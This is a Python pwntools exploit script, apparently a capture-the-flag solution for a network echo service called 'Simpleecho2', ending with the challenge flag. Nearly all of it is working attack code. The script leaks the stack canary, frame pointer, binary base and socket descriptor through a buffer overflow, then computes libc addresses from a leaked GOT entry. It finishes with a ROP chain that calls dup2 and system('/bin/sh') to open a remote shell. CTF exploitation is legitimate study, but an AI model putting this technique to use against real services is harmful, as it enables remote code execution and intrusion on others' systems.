#!/usr/bin/env python

from pwn import *

# Simpleecho2 will strart a server at port 12543 
# and create a socket to wait for our connecting
# so  we need to use dup2 to set stdin & stdout to our socket before get shell

# vuln
# char buf[128] ;
# recv(cd,buf,256,0);
lib = ELF('./libc.so.6-64')

r = remote('192.168.31.25',12543)
#r = remote('127.0.0.1',12543)
a = raw_input()
pop_rdi_ret = 0x0000000000001083
pop_rsi_r15_ret = 0x0000000000001081
off_send = 0x201f58  # memset

# Step 1 : get canary 
r.recvuntil('Input:')
r.send('A'*0x89)
res = r.recvuntil('Input:')
canary = res.split('A'*0x89)[1]
canary = '\x00'+canary[:7]
canary = u64(canary)
print 'canary =',hex(canary)

# Step 2 : get ebp
r.send('A'*0x90)
res = r.recvuntil('Input:')
ebp = res.split('A'*0x90)[1].split('Input:')[0]
ebp = ebp + '\x00'*( 8 - len(ebp))
ebp = u64(ebp)
print 'ebp =',hex(ebp)

# Step 3 : get base
r.send('A'*0x98)
res = r.recvuntil('Input:')
main_fe3 = res.split('A'*0x98)[1].split('Input:')[0]
main_fe3 = main_fe3 + '\x00'*( 8 - len(main_fe3))
base  = u64(main_fe3)-0xfe3
print 'base =',hex(base)
pop_rdi_ret = base + pop_rdi_ret
pop_rsi_r15_ret = base + pop_rsi_r15_ret

# Step 4: get socket number
r.send('A'*0xb8)
res = r.recvuntil('Input:')
sok_num = int(res[-7].encode('hex'),16)
print 'socket number =',sok_num

# Step 5: leak memset@got address
payload1 = ''
payload1 += 'exit\n'
payload1 += 'A'*0x83
payload1 += p64(canary)
payload1 += p64(ebp)
payload1 += p64(pop_rdi_ret)
payload1 += p64(sok_num)
payload1 += p64(pop_rsi_r15_ret)
payload1 += p64(base + off_send)
payload1 += p64(base + off_send)
payload1 += p64(base + 0xcf5)
payload1 += p64(base + 0xfde)
r.send(payload1)
res = r.recvuntil('Input:')
address = res.split('~')[1].split('##')[0]
address = address + '\x00'*(8 - len(address))
address = u64(address)
lib_base =  address - lib.symbols['memset'] 
sys_add = lib_base + lib.symbols['system']
bin_sh = lib_base + list(lib.search('/bin/sh'))[0]
dup2_add = lib_base + lib.symbols['dup2']
print 'memset_add =',hex(address)
print 'sys_add =',hex(sys_add)
print 'bin_sh =',hex(bin_sh)
print 'dup2_add =',hex(dup2_add)

# Step 6 : get second canary 
r.send('A'*0x89)
res = r.recvuntil('Input:')
canary = res.split('A'*0x89)[1]
canary = '\x00'+canary[:7]
canary = u64(canary)
print 'canary =',hex(canary)


# Step 7: dup2(sok,0) , dup2(sok,1), system('/bin/sh')
payload2 =''
payload2 += 'exit\n'
payload2 += 'A'*0x83
payload2 += p64(canary)
payload2 += p64(ebp) # not need

# only 11 can use 
# when goes here  rdi has already is the socket num
# so we only need to set rsi
payload2 += p64(pop_rsi_r15_ret)
payload2 += p64(1)
payload2 += p64(1)
payload2 += p64(dup2_add)
#------------------------------------------------4
# set dup2(sock_num, 1) first 
# so  dup2(sock_num, 0) -> rsi = 0  can be used in sys_add 
payload2 += p64(pop_rsi_r15_ret)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(dup2_add)
#------------------------------------------------4+4
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh)
payload2 += p64(sys_add)
#-------------------------------------------------4+4+3 = 11
r.send(payload2)

r.interactive()

#AD{D0_U_kN0w_N37w0Rk_PR09r4m1n9}

